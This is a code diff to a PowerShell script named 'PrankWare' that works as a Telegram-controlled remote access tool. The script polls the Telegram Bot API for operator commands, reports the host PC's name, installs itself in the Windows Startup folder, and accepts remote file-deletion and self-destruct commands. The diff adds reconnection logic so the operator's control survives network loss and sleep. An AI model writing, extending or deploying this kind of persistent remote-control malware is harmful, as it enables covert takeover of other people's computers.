@@ -534,13 +534,94 @@ COMMAND EXECUTION
 
 # --- ALL FUNCTION DEFINITIONS END HERE ---
 
-$botToken = "urtoken"
+# --- CONNECTIVITY & RESUME HANDLERS START ---
+function Test-NetworkOnline {
+    param (
+        [int]$timeoutMs = 3000
+    )
+    try {
+        if (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable()) { return $false }
+
+        $ping = New-Object System.Net.NetworkInformation.Ping
+        $reply = $ping.Send("8.8.8.8", $timeoutMs)
+        if ($reply.Status -ne [System.Net.NetworkInformation.IPStatus]::Success) { return $false }
+
+        $request = [System.Net.HttpWebRequest]::Create("$apiUrl/getMe")
+        $request.Method = "GET"
+        $request.Timeout = $timeoutMs
+        $request.ReadWriteTimeout = $timeoutMs
+        $request.AllowAutoRedirect = $false
+        $response = $request.GetResponse()
+        $response.Close()
+        return $true
+    } catch { return $false }
+}
+
+function Wait-ForNetwork {
+    param (
+        [int]$maxBackoffSec = 60
+    )
+    $backoff = 2
+    while (-not (Test-NetworkOnline)) {
+        try { Write-Host "PrankWare: Waiting for network... retry in $backoff sec" } catch {}
+        Start-Sleep -Seconds $backoff
+        $backoff = [Math]::Min($backoff * 2, $maxBackoffSec)
+    }
+}
+# --- CONNECTIVITY & RESUME HANDLERS END ---
+
+# --- ONLINE/OFFLINE NOTIFIER START ---
+function Start-NetworkMonitor {
+    try {
+        $global:IsOnline = Test-NetworkOnline
+        $global:OfflineAnnounced = $false
+
+        $timer = New-Object System.Timers.Timer
+        $timer.Interval = 10000
+        $timer.AutoReset = $true
+
+        Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
+            try {
+                $nowOnline = Test-NetworkOnline
+
+                if ($nowOnline -and -not $global:IsOnline) {
+                    $global:IsOnline = $true
+                    $global:OfflineAnnounced = $false
+                    try { Send-TelegramMessage -chatId $userId -message "PC is back online: $(Get-PCName)" } catch {}
+                }
+				elseif (-not $nowOnline -and $global:IsOnline) {
+					$global:IsOnline = $false
+					if (-not $global:OfflineAnnounced) {
+						$global:OfflineAnnounced = $true
+						# Offline notification removed
+					}
+				}
+            } catch {}
+        } | Out-Null
+
+        $timer.Start()
+    } catch {}
+}
+
+
+$botToken = "urbot"
 $userId = "urid"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0 # Initial default
 
 
 try {
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}
+
+    $global:JustResumed = $false
+    try {
+        Add-Type -AssemblyName System.Windows.Forms | Out-Null
+        Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName PowerModeChanged -Action {
+            if ($EventArgs.Mode -eq [Microsoft.Win32.PowerModes]::Resume) { $global:JustResumed = $true }
+        } | Out-Null
+    } catch {}
+
+    Wait-ForNetwork
     Write-Host "PrankWare: Checking for pending Telegram commands on startup..."
     $pendingUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=100&timeout=10" 
     
@@ -568,6 +649,8 @@ try {
 
 Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"
 
+Start-NetworkMonitor
+
 $scriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($scriptPath)
 $startupFolder = [System.Environment]::GetFolderPath('Startup')
@@ -589,6 +672,19 @@ $global:CurrentDirectory = (Get-Location).Path
 
 while ($true) {
     try {
+        if ($global:JustResumed) {
+            $global:JustResumed = $false
+            try {
+                Wait-ForNetwork
+                $resumeUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=1&timeout=1"
+                if ($resumeUpdates.ok -and $resumeUpdates.result.Count -gt 0) {
+                    $lastUpdateId = ($resumeUpdates.result | Sort-Object update_id -Descending | Select-Object -First 1).update_id
+                }
+                Send-TelegramMessage -chatId $userId -message "System resumed from sleep. Reconnected on PC: $(Get-PCName)"
+            } catch {}
+        }
+
+        Wait-ForNetwork
         $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
         foreach ($update in $updates.result) {
             $lastUpdateId = $update.update_id
@@ -599,7 +695,6 @@ while ($true) {
 
 
 
-            # Ensure CurrentDirectory is always initialized at the start of the loop
             if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
                 $global:CurrentDirectory = (Get-Location).Path
             }
@@ -744,7 +839,6 @@ while ($true) {
                 Invoke-SelfDestruct -chatId $chatId
                 continue
             }
-            # New file operation commands
             elseif ($text -match "^/delete\s+(.+)$") {
                 $path = $matches[1].Trim('"')
                 $reply = Remove-FileOrFolder -chatId $chatId -path $path
@@ -793,6 +887,8 @@ while ($true) {
         }
         Start-Sleep -Seconds 2
     } catch {
-        Start-Sleep -Seconds 5
+        try { Write-Host "PrankWare: Poll error: $($_.Exception.Message). Waiting for network..." } catch {}
+        Wait-ForNetwork
+        Start-Sleep -Seconds 2
     }
 }
